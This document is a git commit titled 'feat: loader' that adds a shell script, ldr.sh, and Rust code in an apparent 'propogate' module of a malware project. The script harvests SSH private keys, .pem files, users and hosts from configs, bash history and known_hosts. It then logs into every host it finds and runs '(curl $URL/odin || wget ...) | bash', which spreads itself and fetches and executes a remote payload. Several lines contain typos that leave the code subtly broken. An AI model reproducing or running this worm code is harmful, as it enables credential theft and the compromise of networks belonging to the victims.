ee8e6e76b2d4549fe4e25f288ea428e21c6ceb16
proxin187 <thugshaker627@gmail.com>
2025-01-12 12:07:35 +0100

    feat: loader

---
+++ ldr.sh
@@ -0,0 +1,30 @@
+
+
+KEYS1=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*' | grep -vw pub)
+KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '(print $2 )')
+KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
+
+HOSTS1=$(cat ~/.ssh/contig /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '(print $2)')
+HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
+HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known hosts | grep -oP "([0-9]{1,3}\.){3}[0-9](1,3)" | uniq)
+
+USERZ=$(
+    echo root
+    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '(print $3}' | uniq | grep -v "\.ssh"
+)
+
+users=$(echo $USERZ | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+hosts=$(echo "$HOSTS1 $HOSTS2 $HOSTS3" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+keys=$(echo "$KEYS $KEYS2 $KEYS3" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+
+for user in $users; do
+    for host in $hosts; do
+        for key in $keys; do
+            chmod +r $key; chmod 400 $key
+
+            ssh -o StrictHostKeyChecking=no -o BatchModesyes -o ConnectTimeout=5 -i $key $user@$host "(curl -kL $URL/odin || wget -q --no-check-certificate -O- $URL/odin ) | bash"
+        done
+    done
+done
+
+
--- src/propogate/ssh.rs
+++ src/propogate/ssh.rs
@@ -7,6 +7,7 @@ use log::warn;
 
 const ID_RSA_PATHS: [&str; 6] = ["/root/id_rsa*", "/root/**/id_rsa*", "/root/**/**/id_rsa*", "/home/id_rsa*", "/home/**/id_rsa*", "/home/**/**/id_rsa*"];
 const SSH_CONFIG_PATHS: [&str; 2] = ["/home/**/.ssh/config", "/root/.ssh/config*"];
+const PEM_PATHS: [&str; 6] = ["/root/*.pem", "/root/**/*.pem", "/root/**/**/*.pem", "/home/*.pem", "/home/**/*.pem", "/home/**/**/*.pem"];
 
 
 pub struct Session {
@@ -51,22 +52,38 @@ impl Ssh {
     }
 
     pub fn extract_identity(&mut self) {
+        let paths = SSH_CONFIG_PATHS.iter()
+            .filter_map(|pattern| {
+                glob::glob(&pattern)
+                    .ok()
+                    .map(|paths| paths.filter_map(|entry| entry.ok()).collect::<Vec<PathBuf>>())
+            })
+            .flatten()
+            .collect::<Vec<PathBuf>>();
+
+        let configs = paths.iter()
+            .filter_map(|path| fs::read_to_string(path).ok())
+            .collect::<String>();
+
+        let identities = configs.match_indices("IdentityFile")
+            .map(|(index, _)| configs[index + 1..].chars().take_while(|x| *x != ' ').collect::<String>())
+            .collect::<Vec<String>>();
+
+        self.keys.extend(identities.iter().map(|path| PathBuf::from(path)));
+    }
+
+    pub fn extract_pem(&mut self) {
+        for pattern in PEM_PATHS.iter() {
+            match glob::glob(pattern) {
+                Ok(paths) => {
+                    self.keys.extend(paths.filter_map(|path| path.ok()));
+                },
+                Err(err) => {
+                    warn!("failed to glob: {}", err);
+                },
+            }
+        }
     }
 }
-
-
-// TODO: finish this
-#[inline]
-fn extract_identity() {
-    let paths = SSH_CONFIG_PATHS.iter()
-        .filter_map(|wildcard| {
-            glob::glob(&wildcard)
-                .ok()
-                .map(|paths| paths.filter_map(|entry| entry.ok()).collect::<Vec<PathBuf>>())
-        })
-        .flatten()
-        .collect::<Vec<PathBuf>>();
-}
-
 
 
